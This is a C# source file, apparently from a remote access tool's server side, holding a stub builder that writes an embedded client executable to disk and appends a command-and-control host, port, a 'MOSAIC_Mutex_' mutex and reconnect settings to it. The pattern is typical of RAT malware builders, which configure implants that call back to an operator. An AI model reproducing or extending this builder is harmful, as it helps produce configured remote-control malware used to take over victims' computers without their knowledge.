using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

namespace Serveur.Controllers
{
    class FrmBuilderController
    {
        //Propriétés
        public string ReconnectTries { get; set; }

        public FrmBuilderController()
        {

        }

        public void create_stub(string host, string port, string mutex, string numReconnectTries)
        {
            SaveFileDialog save_file = new SaveFileDialog();
            try
            {
                save_file.Filter = "Application |*.exe";
                if (save_file.ShowDialog() == DialogResult.OK)
                {
                    File.WriteAllBytes(Application.StartupPath + "\\client.exe", Properties.Resources.Client);
                    File.Copy(Application.StartupPath + "\\client.exe", save_file.FileName);
                    FileStream stream = new FileStream(save_file.FileName, FileMode.Append);
                    BinaryWriter writer = new BinaryWriter(stream);
                    writer.Write("-STARThost-" + host + "-ENDhost-");
                    writer.Write("-STARTport-" + port + "-ENDport-");
                    writer.Write("-STARTmutex-" + getUniqueMutex(18) + "-ENDmutex-");
                    writer.Write("-STARTrecoTries-" + numReconnectTries + "-ENDrecoTries-");
                    writer.Flush();
                    writer.Close();
                    stream.Close();
                    File.Delete(Application.StartupPath + "\\client.exe");
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show("Erreur lors de la création du stub");
            }
        }

        public string getUniqueMutex(int maxSize)
        {
            char[] chars = new char[62];
            chars =
            "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890".ToCharArray();
            byte[] data = new byte[1];
            using (RNGCryptoServiceProvider crypto = new RNGCryptoServiceProvider())
            {
                crypto.GetNonZeroBytes(data);
                data = new byte[maxSize];
                crypto.GetNonZeroBytes(data);
            }
            StringBuilder result = new StringBuilder(maxSize);
            foreach (byte b in data)
            {
                result.Append(chars[b % (chars.Length)]);
            }
            return "MOSAIC_Mutex_" + result.ToString();
        }
    }
}
